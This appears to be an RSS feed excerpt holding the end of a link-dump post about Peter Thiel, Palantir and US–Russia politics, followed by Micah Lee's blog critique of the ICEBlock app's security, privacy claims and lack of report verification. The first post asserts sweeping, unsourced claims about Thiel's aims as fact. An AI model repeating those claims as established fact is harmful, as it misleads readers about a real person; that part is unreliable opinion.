-<p><a href="https://youtu.be/qqHueZNEzig?si=Lz7f-H34UrZ05eFB">https://youtu.be/qqHueZNEzig?si=Lz7f-H34UrZ05eFB</a></p>
-
-<p>In the UK, Palantir is used in the NHS.</p>
-
-<p><a href="https://www.theguardian.com/society/2023/nov/21/patient-privacy-fears-us-spy-tech-firm-palantir-wins-nhs-contract">https://www.theguardian.com/society/2023/nov/21/patient-privacy-fears-us-spy-tech-firm-palantir-wins-nhs-contract</a></p>
-
-<p><a href="https://pt.m.wikipedia.org/wiki/Palantir_Technologies">https://pt.m.wikipedia.org/wiki/Palantir_Technologies</a></p>
-
-<p><a href="https://www.theguardian.com/technology/2025/aug/04/tech-trillion-dollars-palantir-techscape">https://www.theguardian.com/technology/2025/aug/04/tech-trillion-dollars-palantir-techscape</a></p>
-
-<p>Peter Thiel, co-founder of PayPal, owner of the military technology companies Palantir and Anduril, an early investor in Facebook, the man who has openly declared since the 2000s that democracy is a mistake and that he wants to destroy the United States and European countries to establish city-states, each governed by a different corporation (fiefdoms), on our ruins, has always chosen his projects based on a clear political vision. Unlike other businessmen, Thiel is more of an activist than an investor. For example, PayPal was initially intended as an alternative to the American banking system to undermine and eventually overthrow the government; this is what attracted Thiel's attention to the project in the first place. Palantir, it seems to me, is no different.</p>
-
-<p><a href="https://youtu.be/mfXbyQ9KFdg?si=3x9G8Py8naetTP8J">The Gravedigger of Democracy</a></p>
-
-<p><a href="https://en.m.wikipedia.org/wiki/Peter_Thiel">https://en.m.wikipedia.org/wiki/Peter_Thiel</a></p>
-
-<p><a href="https://www.praxisnation.com/">https://www.praxisnation.com/</a></p>
-
-<p><a href="https://en.m.wikipedia.org/wiki/Praxis_(proposed_city)">https://en.m.wikipedia.org/wiki/Praxis_(proposed_city)</a></p>
-
-<p><a href="https://en.m.wikipedia.org/wiki/Balaji_Srinivasan">https://en.m.wikipedia.org/wiki/Balaji_Srinivasan</a></p>
-
-<p>"Gandalf is the madman who wants to start a war... Mordor is a technological civilization based on reason and science. Outside of Mordor, everything is kind of mystical and environmental, and nothing works.", Peter Thiel</p>
-
-<p><a href="https://en.m.wikipedia.org/wiki/Dark_Enlightenment">https://en.m.wikipedia.org/wiki/Dark_Enlightenment</a></p>
-
-<p>The fact that JD Vance, a creature of Peter's, is Vice-President clearly demonstrates the power of influence he has achieved to introduce his beliefs into the White House policies.</p>
-
-<p><a href="https://www.google.com/amp/s/www.cbsnews.com/amp/news/jd-vance-trump-vp-peter-thiel-billionaire/">https://www.google.com/amp/s/www.cbsnews.com/amp/news/jd-vance-trump-vp-peter-thiel-billionaire/</a></p>
-
-<p>And by the way, keep an eye on this new meeting between Trump and Putin. Since the 90s, we've been aware of the Russian elites' declared ambitions,</p>
-
-<p><a href="https://en.m.wikipedia.org/wiki/Foundations_of_Geopolitics">https://en.m.wikipedia.org/wiki/Foundations_of_Geopolitics</a></p>
-
-<p>Which now apparently partially overlaps with the ambitions of the American ones,</p>
-
-<p><a href="https://en.m.wikipedia.org/wiki/Project_2025">https://en.m.wikipedia.org/wiki/Project_2025</a></p>
-
-<p><a href="https://www.nationalreview.com/corner/why-the-heritage-foundation-keeps-popping-up-in-russian-media/">https://www.nationalreview.com/corner/why-the-heritage-foundation-keeps-popping-up-in-russian-media/</a></p>
-
-<p><a href="https://www.youtube.com/live/aqgfhZpRZhg?si=S-SQUragmZxjMiJs">https://www.youtube.com/live/aqgfhZpRZhg?si=S-SQUragmZxjMiJs</a></p>
-
-<p><a href="https://crisismagazine.com/opinion/the-final-conversations-of-a-dying-priest">https://crisismagazine.com/opinion/the-final-conversations-of-a-dying-priest</a></p>
-
-<p><a href="https://www.politico.eu/article/russia-plot-against-the-west-vladimir-putin-donald-trump-europe/">https://www.politico.eu/article/russia-plot-against-the-west-vladimir-putin-donald-trump-europe/</a></p>
-
-<p><a href="https://www.businessinsider.com/fbi-peter-thiel-vladimir-putin-russia-christian-angermayer-daniil-bisslinger-2023-11">https://www.businessinsider.com/fbi-peter-thiel-vladimir-putin-russia-christian-angermayer-daniil-bisslinger-2023-11</a></p>
-
-<p><a href="https://www.wired.com/story/palantir-doge-irs-mega-api-data/">https://www.wired.com/story/palantir-doge-irs-mega-api-data/</a></p>
-
-<p><a href="https://www.theverge.com/2023/10/19/23923759/peter-thiel-fbi-informant-foreign-influence-report">https://www.theverge.com/2023/10/19/23923759/peter-thiel-fbi-informant-foreign-influence-report</a></p>
-
-<p><a href="https://en.m.wikipedia.org/wiki/Steve_Bannon">https://en.m.wikipedia.org/wiki/Steve_Bannon</a></p>
-
-<p><a href="https://www.scielo.br/j/se/a/WQCvpNry8vCKWVXmDpCxp3m/">https://www.scielo.br/j/se/a/WQCvpNry8vCKWVXmDpCxp3m/</a></p>
-
-<p><a href="https://www.newstatesman.com/international-politics/2025/02/steve-bannon-interview-godfather-of-maga-right">https://www.newstatesman.com/international-politics/2025/02/steve-bannon-interview-godfather-of-maga-right</a></p>
-
-<p><a href="https://www.newsweek.com/ivana-trump-letitia-james-new-york-attorney-general-testimony-ivanka-donald-1725005">https://www.newsweek.com/ivana-trump-letitia-james-new-york-attorney-general-testimony-ivanka-donald-1725005</a></p>
-
-<p><a href="https://en.m.wikipedia.org/wiki/Ivana_Trump">https://en.m.wikipedia.org/wiki/Ivana_Trump</a></p>
-
-<p><a href="https://www.theguardian.com/us-news/2018/oct/29/czechoslovakia-spied-on-trump-to-exploit-ties-to-highest-echelons-of-us-power">https://www.theguardian.com/us-news/2018/oct/29/czechoslovakia-spied-on-trump-to-exploit-ties-to-highest-echelons-of-us-power</a></p>
-
-<p><a href="https://www.project2025.observer/">https://www.project2025.observer/</a></p>
-</div></div>]]></description>
-        </item>
-        <item>
-            <title><![CDATA[Unfortunately, the ICEBlock app is activism theater (128 pts)]]></title>
-            <link>https://micahflee.com/unfortunately-the-iceblock-app-is-activism-theater/</link>
-            <guid>45101117</guid>
-            <pubDate>Tue, 02 Sep 2025 10:19:31 GMT</pubDate>
-            <description><![CDATA[<p>URL: <a href="https://micahflee.com/unfortunately-the-iceblock-app-is-activism-theater/">https://micahflee.com/unfortunately-the-iceblock-app-is-activism-theater/</a>, See on <a href="https://news.ycombinator.com/item?id=45101117">Hacker News</a></p>
-<div id="readability-page-1" class="page"><div>
-            <article>
-                    <header>
-                        
-                            <figure>
-        <img srcset="https://micahflee.com/content/images/size/w300/2025/08/vlcsnap-2025-08-31-10h16m03s490.png 300w,
-                    https://micahflee.com/content/images/size/w720/2025/08/vlcsnap-2025-08-31-10h16m03s490.png 720w,
-                    https://micahflee.com/content/images/size/w960/2025/08/vlcsnap-2025-08-31-10h16m03s490.png 960w,
-                    https://micahflee.com/content/images/size/w1200/2025/08/vlcsnap-2025-08-31-10h16m03s490.png 1200w,
-                    https://micahflee.com/content/images/size/w2000/2025/08/vlcsnap-2025-08-31-10h16m03s490.png 2000w,
-                    https://micahflee.com/content/images/2025/08/vlcsnap-2025-08-31-10h16m03s490.png" sizes="(max-width: 1200px) 100vw, 1200px" src="https://micahflee.com/content/images/size/w1200/2025/08/vlcsnap-2025-08-31-10h16m03s490.png" alt="Unfortunately, the ICEBlock app is activism theater">
-            <figcaption><span>ICEBlock developer Joshua Aaron speaking remotely at Hackers on Planet Earth on August 17</span></figcaption>
-    </figure>
-                    </header>
-
-                <section>
-                    <p>At this summer's HOPE conference, Joshua Aaron spoke about <a href="https://www.iceblock.app/" rel="noreferrer">ICEBlock</a>, his iPhone app that allows users to anonymously report ICE sightings within a 5 mile radius, and to get notifications when others report ICE sightings near them. You can see the full talk, and the lively/infuriating Q&amp;A, <a href="https://www.youtube.com/live/Pm4tC2Mnabs?t=22330s" rel="noreferrer">here</a>, starting at 6:12:10.</p><p>Thanks to repression from the highest levels of the Trump administration, his app has gone viral and garnered over a million downloads from the App Store. Karoline Leavitt <a href="https://www.foxnews.com/media/karoline-leavitt-accuses-cnn-encouraging-violence-against-agents-reports-new-ice-tracking-app" rel="noreferrer">called it</a> "an incitement of further violence against our ICE officers." Tom Homan <a href="https://xcancel.com/bennyjohnson/status/1939722973373497632" rel="noreferrer">said</a>, "DOJ needs to look at this and see if they're crossing that line." Kristi Noem <a href="https://www.newsweek.com/kirsti-noem-iceblock-deportation-immigration-app-2092878" rel="noreferrer">called the app</a> "obstruction of justice." Pam Bondi <a href="https://www.foxnews.com/media/attorney-general-pam-bondi-warns-iceblock-app-developer-watch-out-says-doj-looking-him" rel="noreferrer">announced</a> "we are looking at it, we are looking at him, and he better watch out, because that's not a protected speech." (Notifying people about ICE sightings is protected speech, no matter what the fascist Attorney General says.) Joshua and his family have been receiving threats.</p><p>But unfortunately, despite the app’s goal of protecting people from ICE, its viral success, and the state repression against it, ICEBlock has serious issues:</p><p>Most importantly, it wasn’t developed with input from people who actually defend immigrants from deportation. As a result, it doesn’t provide people with what they need to stay safe.</p><p>Because ICE sightings in the app aren’t verified in any way, it's likely that most reports in the app aren't actually ICE, even if they’re posted by people who mean well – as I describe below, the vast majority of ICE reports are false positives.</p><p>And judging by the App Store reviews, it’s clear that not everyone means well. One review says: “This is a great app for safety information. Unfortunately MAGA is now posting false information on there and making racist comments in the comment section.”</p><p>Joshua makes strong claims about the security and privacy of his app without backing any of them up with technical details. Many of his claims are false. He also chose to target only iOS, and not Android, because of a <a href="https://bsky.app/profile/grapheneos.org/post/3lt2prfb2vk2r" rel="noreferrer">misunderstanding</a> about how Android push notifications work. And even worse, during the Q&amp;A, he made it clear that he didn't understand terms like “warrant canary,” "reverse engineering," or “security through obscurity,” which doesn't inspire confidence.</p><h2 id="privacy-promises-without-the-evidence">Privacy promises without the evidence</h2><p>When I first heard about ICEBlock, I liked the idea, but I – and others in various group chats I'm part of – were skeptical.</p><p>Joshua promises that ICE reports are "completely anonymous," that the app doesn't store any personal data, and that it's "impossible to trace reports back to individual users." These are bold claims that he hasn't backed up with evidence. Unlike reputable privacy tools, ICEBlock isn't open source (in the talk, he explicitly rejected the idea of open sourcing it or allowing the security community to help him improve it), and Joshua hasn't published a threat model or technical documentation explaining how his app keeps these promises.</p><p>My friend Cooper Quintin, a security researcher at EFF, was also skeptical of ICEBlock, and so he <a href="https://bsky.app/profile/cooperq.com/post/3ltzl5a7y5c2d" rel="noreferrer">reverse engineered it</a>, and spoke to 404 Media about <a href="https://www.404media.co/immigration-raid-tracking-app-ice-block-keeps-your-data-private-researcher-finds/" rel="noreferrer">his findings</a>. He largely confirmed Joshua's claims:</p><figure><blockquote data-bluesky-uri="at://did:plc:t3zkzmz2242yi4rj4lwj7ux4/app.bsky.feed.post/3ltzl5bqmrs2d" data-bluesky-cid="bafyreiaadwar2akdnjfqolubdu4zhbfxxqvc6zz6ygxcxzdsbhz5pp7mji"><p lang="en">The TL;DR is that I didn't find anything suspicious, the app doesn't talk to any third parties, and it doesn't send your location to the developer. Neither your phone ID or iCloud account are associated with the requests the app sends to the apple cloud servers to run. (2/11)</p>— <a href="https://bsky.app/profile/did:plc:t3zkzmz2242yi4rj4lwj7ux4?ref_src=embed">Exploit Code Not People (@cooperq.com)</a> <a href="https://bsky.app/profile/did:plc:t3zkzmz2242yi4rj4lwj7ux4/post/3ltzl5bqmrs2d?ref_src=embed">2025-07-15T18:52:15.697Z</a></blockquote></figure><p>This is great, and it's the reason that (despite his hostility towards transparency) I really do think that Joshua means well.</p><p>Even if we can trust that Joshua isn't collecting data himself, it's difficult to discern what Apple would be able to hand over if it got subpoenaed for data related to his app. The website simply says it's "completely anonymous," without any caveats.</p><p>But ignoring the lack of transparency, there's an even larger problem.</p><h2 id="iceblock-spreads-unverified-information-making-it-useless-for-defending-immigrants">ICEBlock spreads unverified information, making it useless for defending immigrants</h2><p>Local immigrant defense groups around the country have been defending people from deportation for the last decade or more. In a training with <a href="https://www.norcalresist.org/" rel="noreferrer">NorCal Resist</a>, I learned that when people post (and repost) unverified reports of ICE sightings on social media, <em>it does more harm than good</em>.</p><p>Millions of people are living in a state of fear. From my experience working with NorCal Resist, <em>most ICE sightings that people hear about aren't real, even when the person reporting it believes that they are.</em> It's common for someone to see a bunch of dudes in uniforms, or sketchy looking vans, and assume it's ICE, when it's actually something else. If I had to guess, I'd say about 98% of reports are false positives.</p><p><em>False reports encourage panic, which doesn't help anyone.</em> Meanwhile, what people actually need are <em>legal observers</em> – people to document the behavior of federal agents, and provide this evidence to their lawyers. They also need help with connecting families of kidnapped people with information and lawyers, and they need communities coming out to defend their neighbors.</p><p>When I asked Joshua about this during the Q&amp;A of his talk, he didn't answer the question. Here's my question and his non-answers:</p><figure data-kg-thumbnail="https://micahflee.com/content/media/2025/09/iceblock-clip1_thumb.jpg" data-kg-custom-thumbnail="">
-            <div>
-                <video src="https://micahflee.com/content/media/2025/09/iceblock-clip1.mp4" poster="https://img.spacergif.org/v1/1920x1080/0a/spacer.png" width="1920" height="1080" playsinline="" preload="metadata"></video>
-                
-                <div>
-                        <p>
-                        
-                        <span>0:00</span></p><p>
-                            /<span>4:46</span>
-                        </p>
-                        </div>
-            </div>
-            <figcaption><p><span>Joshua's non-answer to my question about false positives and user research</span></p></figcaption>
-        <img src="https://micahflee.com/content/media/2025/09/iceblock-clip1_thumb.jpg"></figure><p>Specifically, I asked:</p><blockquote>With my local group, they put a whole lot of energy into verifying every single report before spreading information about it. My question is, how do you know that ICEBlock isn't just full of false positives? And have you done any user research, or worked with local immigration groups to figure out how reliable this is, how much it's actually helping people versus causing panic?</blockquote><p>In an attempt to answer the question about user research, Joshua said, "No, we do not do any user data or metrics." He misunderstood the question, apparently thinking that I meant collecting data from users rather than talking to humans who know more than he does and incorporating their feedback into the design of the app.</p><p>He then explained what ICEBlock does to prevent <em>malicious</em> people from making false reports — including falsely claiming that it's "not possible" to make tons of simultaneous fake reports (more on this below).</p><p>ICEBlock doesn't verify anything, and instead <em>only</em> spreads unverified rumors. To be fair, verification is a <em>very hard problem</em>. In my local group, we have <a href="https://micahflee.com/using-signal-groups-for-activism/" rel="noreferrer">announcement-only Signal groups</a> full of volunteers who physically verify every single ICE sighting that's reported to our rapid response hotline. The vast majority of reports are false positives. There might be several reports a day, but actual ICE or CBP activity is much more rare. I've personally gone to check out maybe 10 to 15 different ICE sightings, only one of which turned out to be actual immigration enforcement (though by the time I got to the location, ICE had already left the area). None of these false reports were malicious: they were simply scared people who saw a bunch of vehicles and people in uniforms and reported an ICE sighting, when it was actually something else.</p><p>Another person in the audience asked a similar question:</p><blockquote>I'm wondering, I think someone asked earlier, if in the design of ICEBlock, or even now, are you currently working with immigrant communities to figure out what resources they need?</blockquote><figure data-kg-thumbnail="https://micahflee.com/content/media/2025/09/iceblock-clip2_thumb.jpg" data-kg-custom-thumbnail="">
-            <div>
-                <video src="https://micahflee.com/content/media/2025/09/iceblock-clip2.mp4" poster="https://img.spacergif.org/v1/1920x1080/0a/spacer.png" width="1920" height="1080" playsinline="" preload="metadata"></video>
-                
-                <div>
-                        <p>
-                        
-                        <span>0:00</span></p><p>
-                            /<span>3:18</span>
-                        </p>
-                        </div>
-            </div>
-            <figcaption><p><span>Another question about if Joshua has engaged with community groups</span></p></figcaption>
-        <img src="https://micahflee.com/content/media/2025/09/iceblock-clip2_thumb.jpg"></figure><p>His answer was that ICEBlock has been translated into many different languages. And that the community organizers he's spoken with told him that ICEBlock doesn't meet their needs. So, he decided to not worry about their feedback and do his own thing instead.</p><p><strong>If you want to support people who are actually protecting immigrants from deportation, please </strong><a href="https://www.norcalresist.org/make-a-donation.html" rel="noreferrer"><strong>donate to NorCal Resist</strong></a><strong> or your local community rapid response networks.</strong></p><h2 id="whats-gps-spoofing">What's GPS spoofing?</h2><p>When Joshua explained the safeguards against abuse in the app, he claimed that it's "not possible" to make 100 fake reports in a single morning, in part because you can only make reports within a 5 mile radius of your location. But apparently, Joshua has never heard of GPS spoofing.</p><p>Even though I'm sitting at my house in California right now, here's a screenshot I just took of the ICEBlock app from the Eiffel Tower in Paris. While I won't go into details of the masterful hacking skills that this took, I'll give you a hint: it's the same technique kids use to cheat at Pokemon Go.</p><figure><img src="https://micahflee.com/content/images/2025/09/IMG_0006.PNG" alt="" loading="lazy" width="1170" height="2532" srcset="https://micahflee.com/content/images/size/w600/2025/09/IMG_0006.PNG 600w, https://micahflee.com/content/images/size/w1000/2025/09/IMG_0006.PNG 1000w, https://micahflee.com/content/images/2025/09/IMG_0006.PNG 1170w" sizes="(min-width: 720px) 720px"><figcaption><span>Screenshot of ICEBlock app, with GPS location spoofed to make it think I'm in Paris</span></figcaption></figure><h2 id="make-iceblock-open-source-absolutely-not">Make ICEBlock open source? "Absolutely not."</h2><p>Someone asked whether Joshua would be interested in collaborating with the hacker community on ICEBlock, so they could provide him with advice and help him with feature development.</p><p>Joshua rejected the idea, saying that he believes that he'd need to completely trust anyone he collaborated with. "Believe me when I say I would love help. I'm supporting over a million users myself. There's not some giant company behind this," he said. "But it's really really hard for me to put my trust in somebody, and share the source code, and share the access to this."</p><figure data-kg-thumbnail="https://micahflee.com/content/media/2025/09/iceblock-clip4_thumb.jpg" data-kg-custom-thumbnail="">
-            <div>
-                <video src="https://micahflee.com/content/media/2025/09/iceblock-clip4.mp4" poster="https://img.spacergif.org/v1/1920x1080/0a/spacer.png" width="1920" height="1080" playsinline="" preload="metadata"></video>
-                
-                <div>
-                        <p>
-                        
-                        <span>0:00</span></p><p>
-                            /<span>1:49</span>
-                        </p>
-                        </div>
-            </div>
-            <figcaption><p><span>Joshua explaining that he's building ICEBlock all on his own because he can't trust outside contributors</span></p></figcaption>
-        <img src="https://micahflee.com/content/media/2025/09/iceblock-clip4_thumb.jpg"></figure><p>This is, of course, not how secure software development works. The most widely trusted security and privacy tools that exist, like Signal and Tor, are open source, and they accept peer review and code contributions from the public.</p><p>The thing that makes this perfectly reasonable and safe is <em>code review</em>. If Joshua published the ICEBlock source code, experts in the hacker community could add features or fix bugs for him, and make pull requests with their changes. He could then carefully review the changes before merging them into his codebase. He could reject whatever changes he wants. You don't actually need to trust – or even know the identity of – hackers who help you develop software. This is a solved a problem, and Joshua seems utterly unaware of it.</p><p>My friend Jen Helsby, the CTO of Freedom of the Press Foundation and a SecureDrop developer, explicitly asked if he would be open to making ICEBlock open source. Here's the clip:</p><figure data-kg-thumbnail="https://micahflee.com/content/media/2025/09/iceblock-clip5_thumb.jpg" data-kg-custom-thumbnail="">
-            <div>
-                <video src="https://micahflee.com/content/media/2025/09/iceblock-clip5.mp4" poster="https://img.spacergif.org/v1/1920x1080/0a/spacer.png" width="1920" height="1080" playsinline="" preload="metadata"></video>
-                
-                <div>
-                        <p>
-                        
-                        <span>0:00</span></p><p>
-                            /<span>1:40</span>
-                        </p>
-                        </div>
-            </div>
-            <figcaption><p><span>Joshua will not release ICEBlock as open source because he doesn't believe in reverse engineering and thinks keeping the implementation details of his app obscure makes it more secure</span></p></figcaption>
-        <img src="https://micahflee.com/content/media/2025/09/iceblock-clip5_thumb.jpg"></figure><p>Jen asked:</p><blockquote>There's a lot of secure software, that probably people in this room work on, that is developed in the open, and that is used primarily by at-risk users, including things like Tor, Signal, SecureDrop. That's great, because it makes it easy for folks to contribute. Maybe you don't want that, I understand that can be hard. But it also makes it easier for people to audit and gain assurance that the app is doing what you claim without having to have, you know, EFF reverse engineer it. Would you be open to making the app open source?</blockquote><p>His answer: "Absolutely not."</p><p>Why? "I don't want anybody from the government to have their hooks in how I'm doing what I'm doing. Once you go open source, everybody has access to it. So I'm just going to keep the codebase private at this time."</p><p>He also claimed that the government can't learn everything about how an app works by reverse engineering it, which isn't true.</p><p>I agree with Jen. His answers are very concerning.</p><h2 id="whats-security-through-obscurity">What's security through obscurity?</h2><p>Another person asked specifically how concealing the details of how the app works from the government is distinguishable from security through obscurity, Joshua agreed that security through obscurity is terrible... and denied that he's doing it?</p><figure data-kg-thumbnail="https://micahflee.com/content/media/2025/09/iceblock-clip6_thumb.jpg" data-kg-custom-thumbnail="">
-            <div>
-                <video src="https://micahflee.com/content/media/2025/09/iceblock-clip6.mp4" poster="https://img.spacergif.org/v1/1920x1080/0a/spacer.png" width="1920" height="1080" playsinline="" preload="metadata"></video>
-                
-                <div>
-                        <p>
-                        
-                        <span>0:00</span></p><p>
-                            /<span>0:37</span>
-                        </p>
-                        </div>
-            </div>
-            <figcaption><p><span>Joshua falsely claiming he doesn't do security through obscurity</span></p></figcaption>
-        <img src="https://micahflee.com/content/media/2025/09/iceblock-clip6_thumb.jpg"></figure><p>In case you're not aware of this term, the first sentence of the Wikipedia <a href="https://en.wikipedia.org/wiki/Security_through_obscurity" rel="noreferrer">article</a> on security through obscurity has a concise definition:</p><blockquote>In security engineering, <strong>security through obscurity</strong> is the practice of concealing the details or mechanisms of a system to enhance its security.</blockquote><p>NIST's <a href="https://csrc.nist.gov/pubs/sp/800/123/final" rel="noreferrer">General Guide to Server Security</a> lists "Open Design" as a core security principle, saying that, "System security should not depend on the secrecy of the implementation or its components."</p><p>Minutes before this, Joshua had just finishing explaining that he definitely won't open source his app because, "I don't want anybody from the government to have their hooks in how I'm doing what I'm doing."</p><p>He's implying that his code includes some "secret sauce" that, if it were made public, would make the app less secure, so he can't risk letting anyone discover how it works. This is the <em>definition</em> of security through obscurity.</p><h2 id="my-server-is-highly-secure-he-says-to-a-room-full-of-hackers">My server is "HIGHLY secure," he says to a room full of hackers</h2><p>Throughout the Q&amp;A, Joshua kept referencing the security of his server. At one point, he even said that he built it himself and it's "<em>HIGHLY</em> secure." He also assured the audience, "Trust me when I tell you, I think about <em>EVERYTHING</em> to the Nth degree."</p><p>It took about 20 minutes of digging around to discover that the server that hosts the iceblock.app website is running on Linode and also hosts the websites of several of Joshua's other projects, going back decades. This includes a website for his IT consulting business, his band, etc. If any one of those old websites gets hacked, it's possible that the hacker could more easily access ICEBlock data that's stored on the same server.</p><p>Without providing more details, I also discovered that his server is running outdated software with known vulnerabilities.</p><h2 id="whats-a-warrant-canary">What's a warrant canary?</h2><p>At one point, a lawyer asked some excellent legal questions:</p><blockquote>I'm curious if ICEBlock either currently or has intentions to implement something like a warrant canary or other method. And more generally, whether you have received anything like search warrants, or All Writs Act requests, or anything else. Things like more intrusive means of obtaining information from ICEBlock. Things like requests for live interception, which would be authorized under a search warrant. And if you have a response plan in place already for those.</blockquote><figure data-kg-thumbnail="https://micahflee.com/content/media/2025/09/iceblock-clip3_thumb.jpg" data-kg-custom-thumbnail="">
-            <div>
-                <video src="https://micahflee.com/content/media/2025/09/iceblock-clip3.mp4" poster="https://img.spacergif.org/v1/1920x1080/0a/spacer.png" width="1920" height="1080" playsinline="" preload="metadata"></video>
-                
-                <div>
-                        <p>
-                        
-                        <span>0:00</span></p><p>
-                            /<span>3:56</span>
-                        </p>
-                        </div>
-            </div>
-            <figcaption><p><span>A lawyer asking Joshua about warrant canaries and data requests</span></p></figcaption>
-        <img src="https://micahflee.com/content/media/2025/09/iceblock-clip3_thumb.jpg"></figure><p>If you're not familiar with <a href="https://en.wikipedia.org/wiki/Warrant_canary" rel="noreferrer">warrant canaries</a>, these are basically public notices that say, "I've never been forced to give up user data." If the notice ever gets taken down, the public can infer that the service was in fact forced to hand over user data.</p><p>Joshua said, "No on the warrant canary, because it would probably require some sort of user data to do that." He seemed to think that a warrant canary would be a new feature in the app (that's uh, not what a warrant canary is), and he completely ignored the legal questions, instead opting to talk about why it's important to keep the app design simple.</p><p>When the lawyer asked again what he would do if the government tried to compel him to spy on his users, Joshua simply said, "I'd just tell them to go fuck themselves." It's a good answer, but it's also naive. Government requests can include gag orders, preventing him from telling anyone that he has received them, and punishment for disobeying them can include threats of jail time. It's good to plan ahead. Luckily, he has EFF and ACLU offering him legal support, in case he ever actually has to face something like this.</p><h2 id="its-not-too-late">It's not too late</h2><p>Despite everything, I do think that Joshua's heart is in the right place and that he genuinely wants to help people. He's sticking his neck out to fight fascism, and the far right is harassing him and his family for it.</p><p>This is why I, and several other hackers who attended his HOPE talk, spent so much time and energy (both during his talk and in the days after it) trying to encourage him to open things up so that ICEBlock, and its million-strong userbase, might yet become a helpful tool in defending immigrants against Trump's fascist plans. He has rejected our offers.</p><p>It's possible for him to turn things around, but sadly, I'm not holding my breath.</p>
-                    
-                </section>
-
-                    
-
-                
-            </article>
-    </div></div>]]></description>
         </item>
     </channel>
 </rss>
